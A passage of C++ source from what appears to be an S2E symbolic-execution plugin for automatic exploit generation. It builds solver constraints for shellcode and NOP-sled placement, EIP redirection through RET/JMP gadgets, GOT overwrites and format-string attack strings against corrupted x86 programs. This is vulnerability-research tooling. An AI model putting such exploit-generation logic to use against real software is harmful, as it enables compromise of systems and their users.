        klee::ref<klee::Expr> nopConstraint = klee::ConstantExpr::create(0x1, klee::Expr::Bool);

        for(uint32_t i=1; i<=(unsigned)nopLen; i++) {
            klee::ref<klee::Expr> byte = klee::EqExpr::create(state->readMemory8(shellcodeStart-i), 
                                                    klee::ConstantExpr::create(NOP_VALUE, klee::Expr::Int8));
            nopConstraint = klee::AndExpr::create(nopConstraint, byte);
        }

        return nopConstraint;
    }

    klee::ref<klee::Expr> Exploit::getStringConstraint(S2EExecutionState *state, uint32_t addr, uint8_t *str) {
        klee::ref<klee::Expr> stringConstraint = klee::ConstantExpr::create(0x1, klee::Expr::Bool);

        for(int i=0; str[i]!=0; i++) {
            klee::ref<klee::Expr> byte = klee::EqExpr::create(state->readMemory8(addr+i), 
                                                    klee::ConstantExpr::create(str[i], klee::Expr::Int8));
            stringConstraint = klee::AndExpr::create(stringConstraint, byte);
        }

        return stringConstraint;
    }

#define CORRUPT_EIP 1
#define CORRUPT_EBP 2
#define CORRUPT_ESP 3
    /* For register, hostAddr is the addr of the virtual register
       For symbolic pointer, hostAddr is GVA, but now the symbolic write is not handled by this function */
    void Exploit::onCorruptReg(S2EExecutionState *state, klee::ref<klee::Expr> value, klee::ref<klee::Expr> hostAddr) {
        klee::ConstantExpr *CE = dyn_cast<klee::ConstantExpr> (hostAddr);
        uint64_t concreteHostAddr = 0;
        uint8_t corrupted = 0;

        concreteHostAddr = CE->getZExtValue();
        if(concreteHostAddr == (uint64_t)state->eip) {
            s2e()->getWarningsStream(state) << "[*] EIP is corrupted. vaule: " << std::hex << value << ", concrete: " <<  s2e()->getExecutor()->toConstantSilent(*state, value) << ", process: " << std::hex << *(state->cr3) << ", EIP: " << std::hex << state->getPc() << std::endl;

            corrupted = CORRUPT_EIP;
        }
        else if(concreteHostAddr == (uint64_t)state->ebp) {
            //s2e()->getWarningsStream(state) << "[*] Ebp is corrupted. vaule: " << std::hex /*<< value*/ << ", concrete: " << s2e()->getExecutor()->toConstantSilent(*state, value) << ", process: " << std::hex << *(state->cr3) << ", EIP: " << std::hex << state->getPc() << std::endl;
            corrupted = CORRUPT_EBP;
        }
        else if(concreteHostAddr == (uint64_t)state->esp) {
            //s2e()->getWarningsStream(state) << "[*] Esp is corrupted. vaule: " << std::hex /*<< value*/ << ", concrete: " << s2e()->getExecutor()->toConstantSilent(*state, value) << ", process: " << std::hex << *(state->cr3) << ", EIP: " << std::hex << state->getPc() << std::endl;
            corrupted = CORRUPT_ESP;
        }
        else {
            assert(false && "Some unknown place is corrupted!");
        }

        /* Symbolic EIP */
        if(corrupted == CORRUPT_EIP) {
#ifdef __KS_MHHUANG_STATE_FORK__
            /* Check if we should terminate on symbolic EIP */
            s2e()->getExecutor()->decideTerminateConcrete(state, EVENT_SYM_EIP, 0);
#endif

            enterExploitGenStage(state);

            if(insertShellcodeWithEIPRedirection(state, value)) {
                genExploit(state, "Exploit");
                leaveExploitGenStage(state);
                s2e()->getExecutor()->terminateStateEarly(*state, "Exploit plugin terminate");
            }

            s2e()->getWarningsStream(state) << "[***] Cannot generate exploit" << std::endl;

            // Disable this function until the reset constraint functionality is implemented
#if 0
            state->constraints.erase(state->constraints.size());
            if(insertShellcodeWithEIPRedirection(state, value)) {
                /* Add all possible concolic constraints */
                std::vector<klee::ref<klee::Expr> >::iterator it;
                for(it=state->constraints.concolic_constraints.begin(); it!=state->constraints.concolic_constraints.end(); it++) {
                    if(mayBeTrue(state, *it)) {
                        state->addTempConstraint(*it);
                    }
                }

                genExploit(state, "Exploit_maybe");
                leaveExploitGenStage(state);
                s2e()->getExecutor()->terminateStateEarly(*state, "Exploit plugin terminate");
            }
#endif

            //s2e()->getWarningsStream(state) << "[***] After removing all constraints, still can not generate exploit" << std::endl;

            leaveExploitGenStage(state);
        }
        /* Symbolic EBP */
        else if(corrupted == CORRUPT_EBP) {
#ifdef __MHHUANG_EBP_EXPLOIT__
            enterExploitGenStage(state);

            state->ebpCorrupted = true;
            /* Here maybe we should search the entire addr space, and the address between esp and b0000000 must assigned for low priority */
            //BlockSizeSet symSet = searchExceptFutureStack(state);
            /* Manage to point EBP to a symbolic array that has enough space for argument and return address,
               and has as much lower address space as possible 

               L                             EBP                         H
                                              V
               *********************************************************** => Symbolic array
                             AMAP             Saved EBP|Ret Addr|Arguments
                                              ^^^^^^^^^^^^^^^^^^
                                                   8 Bytes
             */

            uint32_t byteLeftInHighAddr = 8 + FUNC_ARG_SIZE;    /* Left some space for func argument and return address */
            uint32_t candidateAddr = 0;
            while(!m_symSizeSet.empty() && candidateAddr == 0) {
                BlockSizeSetIter it = m_symSizeSet.begin();
                if(it->size >= byteLeftInHighAddr) {
                    uint32_t start = it->addr;
                    uint32_t end = it->addr + it->size - byteLeftInHighAddr;
                    /* We must make start <= EBP <= end, and make EBP as near end as possible
                       First check if we can point EBP within the range */
                    klee::ref<klee::Expr> upperBound = klee::UleExpr::create(value, klee::ConstantExpr::create(end, klee::Expr::Int32));
                    klee::ref<klee::Expr> lowerBound = klee::UgeExpr::create(value, klee::ConstantExpr::create(start, klee::Expr::Int32));
                    klee::ref<klee::Expr> rangeBound = klee::AndExpr::create(upperBound, lowerBound);
                    /* Can not leave enough space for ret addr and argument, put the array in the back of set */
                    if(!mayBeTrue(state, rangeBound)) {
                        m_symSizeSet.erase(it);
                        uint32_t newAddr = end+1;
                        uint32_t newSize = byteLeftInHighAddr-1;
                        m_symSizeSet.insert(MemBlock(newAddr, newSize));
                        continue;
                    }

                    /* Then we check if we can just point EBP to end */
                    klee::ref<klee::Expr> bestCase = klee::EqExpr::create(value, klee::ConstantExpr::create(end, klee::Expr::Int32));
                    if(mayBeTrue(state, bestCase)) {
                        candidateAddr = end;
                        break;
                    }

                    /* If we can not just point EBP to end, then start binary search */
                    while(start < end) {
                        uint32_t mid = start+(end-start+1)/2;
                        upperBound = klee::UleExpr::create(value, klee::ConstantExpr::create(end, klee::Expr::Int32));
                        lowerBound = klee::UgeExpr::create(value, klee::ConstantExpr::create(mid, klee::Expr::Int32));
                        rangeBound = klee::AndExpr::create(upperBound, lowerBound);
                        if(mayBeTrue(state, rangeBound)) {
                            start = mid;
                        }
                        else {
                            /* If there are some other symbolic array */
                            if(m_symSizeSet.size() >= 2) {
                                uint32_t currentSizeLeft = mid-start+byteLeftInHighAddr;

                                BlockSizeSetIter first = m_symSizeSet.begin();
                                BlockSizeSetIter second = first; second++;
                                /* If the size of second large array is larger than current left size */
                                if(currentSizeLeft < second->size) {
                                    m_symSizeSet.erase(first);
                                    m_symSizeSet.insert(MemBlock(start, currentSizeLeft));
                                    break;
                                }
                            }
                            end = mid-1;
                        }
                    }
                    /* Must ensure not the case that break in the middle */
                    if(start == end)
                        candidateAddr = start;
                }
                else {
                    /* We still have some symbolic array that can cover saved EBP and return address */
                    if(it->size >= 8) {
                        /* Lower our expections and try again */
                        byteLeftInHighAddr = 8;
                    }
                    /* No symbolic array have enough space, break */
                    else {
                        s2e()->getWarningsStream(state) << "Can not point EBP to a large enough symbolic array!" << std::endl;
                        break;
                    }
                }
            }

            if(candidateAddr != 0) {
                s2e()->getWarningsStream(state) << "Point EBP to 0x" << std::hex << candidateAddr << std::endl;
                klee::ref<klee::Expr> ebpConstraint = klee::EqExpr::create(value, klee::ConstantExpr::create(candidateAddr, klee::Expr::Int32));
                state->addTempConstraint(ebpConstraint);
            }

            leaveExploitGenStage(state);
#endif
        }
        /* Symbolic ESP */
        else if(corrupted == CORRUPT_ESP) {
        }
    }

    void Exploit::onCorruptPtr(S2EExecutionState *state, klee::ref<klee::Expr> addrExpr, klee::ref<klee::Expr> valueExpr) {
        s2e()->getWarningsStream(state) << "Write symbolic value to symbolic address, trying exploit gen ..." << std::endl;
 
        enterExploitGenStage(state);

        klee::ref<klee::Expr> overwriteGOT = klee::EqExpr::create(
                addrExpr, 
                klee::ConstantExpr::create(m_GOTAddress, klee::Expr::Int32));

        if(mayBeTrue(state, overwriteGOT)) {
            state->addTempConstraint(overwriteGOT);
            if(insertShellcodeWithEIPRedirection(state, valueExpr)) {
                genExploit(state, "Exploit");
                leaveExploitGenStage(state);
                s2e()->getExecutor()->terminateStateEarly(*state, "Exploit plugin terminate");
            }
            else {
                s2e()->getWarningsStream(state) << "Can not generate exploit" << std::endl;
                state->clearTempConstraints();
            }
        }
        else {
            s2e()->getWarningsStream(state) << "Can not overwrite GOT" << std::endl;
        }

        leaveExploitGenStage(state);
    }

    bool Exploit::checkAndAddFmtConstraint(S2EExecutionState *state, FMTProfile *pf) {
        char *fmt = FMTGenerator::genFmt(pf->targetAddr, pf->targetValue, pf->dollarOffset, pf->wordOffset, pf->fmtStart-pf->stringStart);
        if(fmt != NULL) {
            int fmtLen;
            for(fmtLen=0; fmt[fmtLen]!=0; fmtLen++) {}
            pf->fmtEnd = pf->fmtStart+fmtLen-1;
            if(pf->fmtEnd > pf->stringEnd)
                return false;

            klee::ref<klee::Expr> fmtConstraint = getStringConstraint(state, pf->fmtStart, (uint8_t*)fmt);

            klee::ref<klee::Expr> fmtFinishingConstraint = getFmtFinishingConstraint(state, pf);

            klee::ref<klee::Expr> both = klee::AndExpr::create(fmtConstraint, fmtFinishingConstraint);
            if(mayBeTrue(state, both)) {
                state->addTempConstraint(both);
                return true;
            }
        }

        return false;
    }

    klee::ref<klee::Expr> Exploit::getFmtReserveConstraint(S2EExecutionState *state, uint32_t reserveStart, uint32_t reserveEnd) {
        klee::ref<klee::Expr> reserveConstraint = klee::ConstantExpr::create(0x1, klee::Expr::Bool);
        for(uint32_t addr=reserveStart; addr<=reserveEnd; addr++) {
            klee::ref<klee::Expr> byte = klee::EqExpr::create(state->readMemory8(addr), 
                                                    klee::ConstantExpr::create('%', klee::Expr::Int8));
            klee::ref<klee::Expr> tempAnd = klee::AndExpr::create(reserveConstraint, byte);
            if(mayBeTrue(state, tempAnd)) {
                reserveConstraint = tempAnd;
            }
        }

        return reserveConstraint;
    }

    klee::ref<klee::Expr> Exploit::getFmtFinishingConstraint(S2EExecutionState *state, FMTProfile *pf) {
        BlockAddrSet addrSet;
        addrSet.insert(MemBlock(pf->stringStart, pf->stringEnd-pf->stringStart+1));
        deleteBlockRange(addrSet, pf->shellcodeAndNopStart, pf->shellcodeEnd);
        deleteBlockRange(addrSet, pf->fmtStart, pf->fmtEnd);

        klee::ref<klee::Expr> fmtFinishingConstraint = klee::ConstantExpr::create(0x1, klee::Expr::Bool);
        /* Constraint every character in addrSet not to be zero or '%' */
        BlockAddrSetIter it;;
        for(it=addrSet.begin(); it!=addrSet.end(); it++) {
            for(uint32_t i=0; i<it->size; i++) {
                klee::ref<klee::Expr> notPercent = klee::NeExpr::create(state->readMemory8(it->addr+i), 
                                                    klee::ConstantExpr::create('%', klee::Expr::Int8));
                klee::ref<klee::Expr> notZero = klee::NeExpr::create(state->readMemory8(it->addr+i), 
                                                    klee::ConstantExpr::create(0, klee::Expr::Int8));
                klee::ref<klee::Expr> byte = klee::AndExpr::create(notPercent, notZero);

                fmtFinishingConstraint = klee::AndExpr::create(fmtFinishingConstraint, byte);
            }
        }

        /* Constraint the terminate character to be 0 */
        klee::ref<klee::Expr> terminate = klee::EqExpr::create(state->readMemory8(pf->stringEnd+1),
                                                klee::ConstantExpr::create(0, klee::Expr::Int8));

        fmtFinishingConstraint = klee::AndExpr::create(fmtFinishingConstraint, terminate);
        
        return fmtFinishingConstraint;
    }

    bool Exploit::canBeFmtChar(S2EExecutionState *state, uint32_t addr) {
        static char fmtChar[] = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'c', 'x', '%', '$', 'h', 'n'};

        klee::ref<klee::Expr> byte = state->readMemory8(addr);
        if(isa<klee::ConstantExpr>(byte)) {
            return false;
        }

        for(uint32_t i=0; i<sizeof(fmtChar); i++) {
            klee::ref<klee::Expr> canBe = klee::EqExpr::create(byte, 
                klee::ConstantExpr::create(fmtChar[i], klee::Expr::Int8));
            if(!mayBeTrue(state, canBe)) {
                return false;
            }
        }

        return true;
    }

    Exploit::BlockAddrSet Exploit::searchFmtArray(S2EExecutionState *state, uint32_t start, uint32_t end) {
        BlockAddrSet addrSet;

        for(uint32_t blockStart=start; blockStart<=end;) {
            if(canBeFmtChar(state, blockStart)) {
                uint32_t blockEnd;
                for(blockEnd=blockStart+1; blockEnd<=end; blockEnd++) {
                    if(!canBeFmtChar(state, blockEnd)) {
                        break;
                    }
                }
                blockEnd--;

                addrSet.insert(MemBlock(blockStart, blockEnd-blockStart+1));
                blockStart = blockEnd+1;
            }
            else {
                blockStart++;
            }
        }

        return addrSet;
    }

    Exploit::BlockAddrSet Exploit::searchMappedBlock(S2EExecutionState *state) {
        std::vector<MemBlock> mappedBlocks;
        for(uint64_t addr=0; addr<=0xffffffff; addr+=TARGET_PAGE_SIZE) {
            uint64_t hostAddress = state->getHostAddress(addr);
            if(hostAddress != (uint64_t)-1) {
                if(mappedBlocks.empty()) {
                    mappedBlocks.push_back(MemBlock(addr, TARGET_PAGE_SIZE));
                }
                else {
                    if(addr == mappedBlocks.back().addr + mappedBlocks.back().size) {
                        mappedBlocks.back().size += TARGET_PAGE_SIZE;
                    }
                    else {
                        mappedBlocks.push_back(MemBlock(addr, TARGET_PAGE_SIZE));
                    }
                }
            }
        }

        BlockAddrSet mappedSet(mappedBlocks.begin(), mappedBlocks.end());
        return mappedSet;
    }

#define SHORTEST_FMT_LEN   65 
    /* Note the shellcode can not contain 0x0 or '%' */
    void Exploit::onCorruptFmt(S2EExecutionState *state, uint32_t fmt, uint32_t dollarOffset, uint32_t wordOffset) {
        s2e()->getWarningsStream(state) << "Format string is corrupted" << 
                                            ", dollarOffset: " << dollarOffset << 
                                            ", wordOffset: " << wordOffset << std::endl;

        enterExploitGenStage(state);

        /* Get the length of formating string */
        uint32_t stringLen;
        for(stringLen=0; ; stringLen++) {
            klee::ref<klee::Expr> byte = state->readMemory8(fmt+stringLen);
            klee::ref<klee::ConstantExpr> ce = s2e()->getExecutor()->toConstantSilent(*state, byte);
            if(ce->getZExtValue() == 0) {
                break;
            }
        }

        uint32_t stringStart = fmt;
        uint32_t stringEnd = stringStart+stringLen-1;
        uint32_t reservedStart;
        uint32_t reservedEnd;

        /* Search less constrainted blocks where we can put attack string */
        BlockAddrSet fmtAddrSet = searchFmtArray(state, stringStart, stringEnd);
        BlockAddrSetIter ait = fmtAddrSet.end();
        if(ait == fmtAddrSet.begin()) {
            s2e()->getWarningsStream(state) << "No symbolic block to put FMT" << std::endl;
            leaveExploitGenStage(state);
            return;
        }
        ait--;
        while(1) {
            if(ait->size >= SHORTEST_FMT_LEN) {
                reservedEnd = ait->addr+ait->size-1;
                reservedStart = reservedEnd-SHORTEST_FMT_LEN+1;
                break;
            }
            else {
                if(ait == fmtAddrSet.begin()) {
                    s2e()->getWarningsStream(state) << "No large enough symbolic block to put FMT" << std::endl;
                    leaveExploitGenStage(state);
                    return;
                }
                else {
                    ait--;
                }
            }
        }

        /* fmtReserveConstraint is used to reserve a space for attack string
           so that ShellcodeAddrManager won't use choose those addresses where
           attack string and shellcode may overlap */
        klee::ref<klee::Expr> fmtReserveConstraint = getFmtReserveConstraint(state, reservedStart, reservedEnd);
        state->addTempConstraint(fmtReserveConstraint);

        ShellcodeAddrManager addrManager(state, this);
        ait = m_symAddrSet.begin();
        while(ait != m_symAddrSet.end()) {
            addrManager.addSymbolicRange(ait->addr, ait->addr+ait->size-1);
            ait++;
        }

        ait = m_symAddrSet.begin();
        while(ait != m_symAddrSet.end()) {
            /* Mark the tail as uninsertable */
            uint32_t end = ait->addr+ait->size-1;
            uint32_t uninsertableStart = (ait->size>=m_shellcodeVector.size() ? end-m_shellcodeVector.size()+2 : ait->addr);
            addrManager.updateUninsertable(uninsertableStart, end);
            ait++;
        }

        while(1) {
            StartAddrProfile pf = addrManager.getAddrWithPossiblyMoreNOP();
            if(pf.addr == 0) {
                s2e()->getWarningsStream(state) << "Can't generate format string exploit!" << std::endl;
                break;
            }

            std::cout << "Trying shellcodeStart 0x" << std::hex << pf.addr << ", size: " << std::dec << m_shellcodeVector.size() << std::endl;

            uint32_t shellcodeStart = pf.addr;
            klee::ref<klee::Expr> shellcodeConstraint = getShellcodeConstraint(state, shellcodeStart);
            state->addTempConstraint(shellcodeConstraint);

            /* Find maximum NOP */
            uint32_t minNop = pf.minNop;
            uint32_t maxNop = pf.maxNop;
            uint32_t actualNop = maxNop;
            /* First try the maximum length */
            klee::ref<klee::Expr> nopConstraint = getNopConstraint(state, shellcodeStart, maxNop);
            /* If we can not insert that much NOP, then start binary search */
            if(!mayBeTrue(state, nopConstraint)) {
                uint32_t low = minNop;
                uint32_t high = maxNop;
                while(low < high) {
                    uint32_t mid = (low+high+1)/2;
                    nopConstraint = getNopConstraint(state, shellcodeStart, mid);
                    if(mayBeTrue(state, nopConstraint)) {
                        low = mid;
                    }
                    else {
                        high = mid-1;
                    }
                }
                actualNop = low;
                nopConstraint = getNopConstraint(state, shellcodeStart, actualNop);
            }

            /* In FMT injection stage, we must remove fmtReserveConstraint */
            state->clearTempConstraints();
            state->addTempConstraint(shellcodeConstraint);
            state->addTempConstraint(nopConstraint);

            /* Find a place for attack string, and find a value that attack string can overwrite to,
               so we have a 2-level loop */
            uint32_t addrToOverwrite = m_GOTAddress;    // The address we want to overwrite, ex: GOT entry
            uint32_t nopMid = shellcodeStart-(actualNop/2); // The address of the middle of NOP in front of shellcode
            uint32_t maxOffset = actualNop/2;

            /* This loop selects the value to replace GOT entry */
            for(uint32_t i=0; i<=maxOffset; i++) {
                std::cout << "    Trying offset " << i << ", max: " << maxOffset << std::endl;

                uint32_t lastFMTStart = 0xffffffff;
                BlockAddrSet fmtStartCandidate = fmtAddrSet;
                deleteBlockRange(fmtStartCandidate, shellcodeStart-actualNop, shellcodeStart+m_shellcodeVector.size()-1);

                /* This loop selects the place to put attack string */
                while(1) {
                    uint32_t fmtStart = findEnoughLenBefore(fmtStartCandidate, lastFMTStart, SHORTEST_FMT_LEN);
                    if(fmtStart == 0) {
                        break;
                    }

                    std::cout << "        Trying fmtStart 0x" << std::hex << fmtStart << 
                                                    ", offset" << std::dec << fmtStart-stringStart << std::endl;

                    FMTProfile fmtPf;
                    fmtPf.targetAddr    = addrToOverwrite;
                    fmtPf.dollarOffset  = dollarOffset;
                    fmtPf.wordOffset    = wordOffset;
                    fmtPf.shellcodeAndNopStart  = shellcodeStart-actualNop;
                    fmtPf.shellcodeEnd  = shellcodeStart+m_shellcodeVector.size()-1;
                    fmtPf.stringStart   = stringStart;
                    fmtPf.stringEnd     = stringEnd;
                    fmtPf.fmtStart      = fmtStart;

                    fmtPf.targetValue   = nopMid-i;
                    if(checkAndAddFmtConstraint(state, &fmtPf)) {
                        s2e()->getWarningsStream(state) << "Insert shellcode at 0x" << std::hex << shellcodeStart << 
                                                            ", nop size: " << std::dec << actualNop <<
                                                            ", fmt start: 0x" << std::hex << fmtStart << 
                                                            ", point EIP to 0x" << fmtPf.targetValue << std::endl;
                        genExploit(state, "Exploit");
                        goto ExploitGenFinished;
                    }

                    fmtPf.targetValue   = nopMid+i;
                    if(checkAndAddFmtConstraint(state, &fmtPf)) {
                        s2e()->getWarningsStream(state) << "Insert shellcode at 0x" << std::hex << shellcodeStart << 
                                                            ", nop size: " << std::dec << actualNop <<
                                                            ", fmt start: 0x" << std::hex << fmtStart << 
                                                            ", point EIP to 0x" << fmtPf.targetValue << std::endl;
                        genExploit(state, "Exploit");
                        goto ExploitGenFinished;
                    }

                    lastFMTStart = fmtStart;
                }
            }

            state->clearTempConstraints();
            state->addTempConstraint(fmtReserveConstraint);
            addrManager.updateUninsertable(shellcodeStart, shellcodeStart);
        }
        
ExploitGenFinished:
        leaveExploitGenStage(state);

        s2e()->getExecutor()->terminateStateEarly(*state, "Exploit plugin terminate");
    }

    /* This function is used to mark the address range that contains input data */
    void Exploit::onSetInputRange(S2EExecutionState *state, uint32_t addr, uint32_t size) {
        m_inputAddr = addr;
        m_inputSize = size;

        /* Save the original concrete input */
        char *path = const_cast<char*> (s2e()->getOutputFilename("OriginalInput").c_str());
        std::ofstream fs(path, std::ios::out | std::ios::binary);

        for(uint32_t i=0; i<size; i++) {
            uint8_t byte;
            assert(state->readMemoryConcrete(addr+i, &byte, 1) && "Input range is either symbolic or not mapped");
            fs.put(byte);
        }

        fs.close();
    }

    /* This function is used to mark the address of each symbolic block */
    void Exploit::onSetSymbolicAddr(S2EExecutionState *state, uint32_t addr, const char *name) {
        if(m_inputAddr != 0) {
            uint32_t offset = addr-m_inputAddr;
            std::string str(name);

            m_offsetSymMap[offset] = str;
        }
    }

    void Exploit::onDumpSymbolicBlocks(S2EExecutionState *state) {
        std::ofstream fs;
        fs.open("/home/mhhuang/symblocks");

        BlockSizeSet symSet = searchSymbolicArray(state, 0, 0xffffffff);
        for(BlockSizeSetIter it = symSet.begin(); it != symSet.end(); it++) {
            for(uint32_t i=0; i<it->size; i++) {
                fs << std::hex << it->addr+i << ": ";

                klee::ref<klee::Expr> value = state->readMemory8(it->addr+i);

                klee::ref<klee::ConstantExpr> ce = s2e()->getExecutor()->toConstantSilent(*state, value);
                uint8_t concreteValue = ce->getZExtValue();
                fs << "0x" << std::hex << (uint32_t)concreteValue << ", "; 

                fs << value;
                fs << std::endl;
            }
            fs << std::endl;
        }

        fs.close();
    }

#define REDIRECTION_NONE    0
#define REDIRECTION_RET     1
#define REDIRECTION_JMP     2
#define REDIRECTION_LAST    3

#define NUM_REDIRECTIONS    REDIRECTION_LAST
    void Exploit::getRedirectionPriority(S2EExecutionState *state, uint32_t *redirections) {
        redirections[0] = REDIRECTION_NONE;

        /* Use different redirection strategies only when no pseudo variables,
           because solving with pseudo variables is time consuming */
#ifndef __KS_MHHUANG_SYM_READ__
        redirections[1] = REDIRECTION_JMP;
        redirections[2] = REDIRECTION_RET;
        redirections[3] = REDIRECTION_LAST;
#else
        redirections[1] = REDIRECTION_LAST;
#endif
    }

    bool Exploit::tryRedirectionRecursive(S2EExecutionState *state, RedirectionContext& ctx) {
        if(ctx.redirectionTimes > NUM_REDIRECTIONS)
            return false;

        uint32_t redirections[NUM_REDIRECTIONS];
        getRedirectionPriority(state, redirections);
        
        std::vector<klee::ref<klee::Expr> > tempConstraints = state->getTempConstraints();
        state->addTempConstraint(ctx.newConstraint);
        for(int i=0; i<NUM_REDIRECTIONS; i++) {
            switch(redirections[i]) {
                case REDIRECTION_NONE:
                    s2e()->getWarningsStream(state) << "[" << ctx.redirectionTimes << "] Trying no EIP redirection.." << std::endl;
                    if(insertShellcode(state, ctx.eipValue)) {
                        return true;
                    }
                    break;
                case REDIRECTION_RET: {
                    s2e()->getWarningsStream(state) << "[" << ctx.redirectionTimes << "] Trying redirect EIP to RET instruction.." << std::endl;
                    /* We only handle concrete ESP for now */
                    klee::ConstantExpr *ce = dyn_cast<klee::ConstantExpr>(ctx.espValue);
                    if(ce == NULL) {
                        s2e()->getWarningsStream(state) << " [" << ctx.redirectionTimes << "] ESP is symbolic!" << std::endl;
                        break;
                    }

                    klee::ref<klee::Expr> retAddr = state->readMemory(ce->getZExtValue(), klee::Expr::Int32);
                    if(retAddr.get() == NULL) {
                        s2e()->getWarningsStream(state) << " [" << ctx.redirectionTimes << "] ESP point to a unmapped address!" << std::endl;
                        break;
                    }
                    if(isa<klee::ConstantExpr>(retAddr)) {
                        s2e()->getWarningsStream(state) << " [" << ctx.redirectionTimes << "] Stack is concrete!" << std::endl;
                        break;
                    }

                    klee::ref<klee::Expr> newESPValue = klee::AddExpr::create(ctx.espValue, 
                            klee::ConstantExpr::create(4, klee::Expr::Int32));

                    RedirectionContext newCtx(ctx.redirectionTimes+1,
                            retAddr, 
                            newESPValue, 
                            klee::ConstantExpr::create(1, klee::Expr::Bool));
                    /* Just try return address first */
                    s2e()->getWarningsStream(state) << " [" << ctx.redirectionTimes << "] Try return address only" <<std::endl;
                    if(tryRedirectionRecursive(state, newCtx) == false) {
                        /* If this trial fails, that means we can't make an exploit with retAddr serves as EIP
                           so we don't need to waste time to search RET instructions */
                        break;
                    }

                    /* If we reach here, that means we can make an exploit with retAddr as EIP.
                       Now state->constraints contains path, shellcode, nop, and subsequent redirection constraints
                       We just try to add the redirection constraint of this stage */
                    uint32_t lastRet = 0;
                    while((lastRet=findFeasibleRet(state, ctx.eipValue, lastRet+1, 0xffffffff)) != 0) {
                        s2e()->getWarningsStream(state) << " [" << ctx.redirectionTimes << "] Try redirecting EIP to actual RET at 0x" << std::hex << lastRet <<std::endl;

                        klee::ref<klee::Expr> eipRedirectionConstraint = 
                            klee::EqExpr::create(ctx.eipValue, klee::ConstantExpr::create(lastRet, klee::Expr::Int32));
                        if(mayBeTrue(state, eipRedirectionConstraint)) {
                            state->addTempConstraint(eipRedirectionConstraint);
                            return true;
                        }
                    }

                    /* If the previous trial fails, maybe because the exploit constraints have some dependency with
                       EIP redirection constraint. For example, maybe we can only insert 5 NOPs if we consider the
                       constraints needed to redirect EIP to a RET instruction, but we ignores such constraints in
                       previous step, so cause 10 NOPs are inserted, and the redirection constraints can't be satisfied.
                       In this case, we should consider the redirection constraint first, and restart the exploit gen */

                    /* First we clear any constraints added in previous step */
                    state->setTempConstraints(tempConstraints);
                    state->addTempConstraint(ctx.newConstraint);

                    lastRet = 0;
                    while((lastRet=findFeasibleRet(state, ctx.eipValue, lastRet+1, 0xffffffff)) != 0) {
                        s2e()->getWarningsStream(state) << " [" << ctx.redirectionTimes << "] Retry redirecting EIP to RET at 0x" << std::hex << lastRet <<std::endl;

                        klee::ref<klee::Expr> eipRedirectionConstraint = 
                            klee::EqExpr::create(ctx.eipValue, klee::ConstantExpr::create(lastRet, klee::Expr::Int32));
                        /* Now we have to consider each redirection constraint at the start */
                        newCtx.newConstraint = eipRedirectionConstraint;
                        if(tryRedirectionRecursive(state, newCtx)) {
                            return true;
                        }
                    }

                    break;
                }
                case REDIRECTION_JMP: {
                    s2e()->getWarningsStream(state) << "[" << ctx.redirectionTimes << "] Trying redirect EIP to JMP instruction.." << std::endl;

                    uint32_t lastSym = 0;
                    while((lastSym=findFeasibleJmp(state, ctx.eipValue, lastSym+1, 0xffffffff)) != 0) {
                        klee::ref<klee::Expr> redirection = klee::EqExpr::create(ctx.eipValue, 
                                klee::ConstantExpr::create(lastSym, klee::Expr::Int32));
                        klee::ref<klee::Expr> jmpOp = klee::EqExpr::create(state->readMemory8(lastSym),
                                klee::ConstantExpr::create(0xe9, klee::Expr::Int8));
                        klee::ref<klee::Expr> eipRedirectionConstraint = 
                            klee::AndExpr::create(redirection, jmpOp);
                        if(mayBeTrue(state, eipRedirectionConstraint)) {
                            klee::ref<klee::Expr> offset = state->readMemory(lastSym+1, klee::Expr::Int32);
                            if(offset.get()!=NULL && !isa<klee::ConstantExpr>(offset)) {
                                s2e()->getWarningsStream(state) << " [" << ctx.redirectionTimes << "] Try redirecting EIP to JMP at 0x" << std::hex << lastSym <<std::endl;

                                /* -mhhuang-delete- */
                                for(int i=1; i<=4; i++) {
                                    klee::ref<klee::Expr> byte = state->readMemory8(lastSym+i);
                                    s2e()->getWarningsStream(state) << "0x" << std::hex << lastSym+i << ": 0x" << findMinimum(state, byte) << "-0x" << findMaximum(state, byte)  << std::endl;
                                }

                                klee::ref<klee::Expr> eipValue = klee::AddExpr::create(
                                        klee::ConstantExpr::create(lastSym+5, klee::Expr::Int32), offset);
                                RedirectionContext newCtx(ctx.redirectionTimes+1,
                                        eipValue,
                                        ctx.espValue,
                                        eipRedirectionConstraint);
                                if(tryRedirectionRecursive(state, newCtx)) {
                                    return true;
                                }
                            }
                        }
                    }

                    break;
                }
                case REDIRECTION_LAST:
                    goto Fail;
            }
        }

Fail:
        s2e()->getWarningsStream(state) << "[" << ctx.redirectionTimes << "] All trials fail" << std::endl;
        state->setTempConstraints(tempConstraints);
        return false;
    }

    bool Exploit::insertShellcodeWithEIPRedirection(S2EExecutionState *state, klee::ref<klee::Expr> eipValue) {
        klee::ref<klee::Expr> espValue = state->readCpuRegister(CPU_OFFSET(regs[R_ESP]), klee::Expr::Int32);
        RedirectionContext ctx(1, eipValue, espValue, klee::ConstantExpr::create(1, klee::Expr::Bool));
        return tryRedirectionRecursive(state, ctx);
    }

    bool Exploit::insertShellcode(S2EExecutionState *state, klee::ref<klee::Expr> eipValue) {
        /* Return to stack */
        if(m_exploitType == 1) {
            s2e()->getWarningsStream(state) << " [*] Insert Shellcode (" << m_shellcodeVector.size() << " bytes)" << std::endl;

            uint32_t shellCode_start; 
            int nop_size;

            nop_size = getMaxNopAndAddr(state, eipValue, "Stack", &shellCode_start);
            if(nop_size != -1) {
                addConstraints(state, eipValue, shellCode_start, nop_size);
                return true;
            }
        }
        /* Return to libc */
        else if(m_exploitType == 2) {
        }
        /* jmp to esp */
        else if (m_exploitType == 3) {
        }

        return false;
    }

    Exploit::BlockSizeSet Exploit::searchSymbolicArray(S2EExecutionState *state,  uint64_t start, uint64_t end) {
        if(start >= end) {
            return BlockSizeSet();
        }

        /* The data structure to store found symbolic array, 
           the first is start GVA, second is size */
        std::vector<MemBlock> sym_table;

        uint64_t virtualAddress = start;
        uint64_t hostAddress;
        while(virtualAddress <= end) {
            hostAddress = state->getHostAddress(virtualAddress);
            /* -mhhuang- Maybe we should check if the page is MMIO or read-only */
            if(hostAddress !=  (uint64_t) -1) {
                klee::ObjectPair op = state->addressSpace.findObject(hostAddress & S2E_RAM_OBJECT_MASK);
                if(!op.second->isAllConcrete()) {
                    uint64_t objectSize = op.second->size;
                    /* The offset within the object */
                    uint64_t objectOffset = (hostAddress & ~S2E_RAM_OBJECT_MASK);
                    /* The virtual address of the start of object */
                    uint64_t objectBase = (virtualAddress & S2E_RAM_OBJECT_MASK);
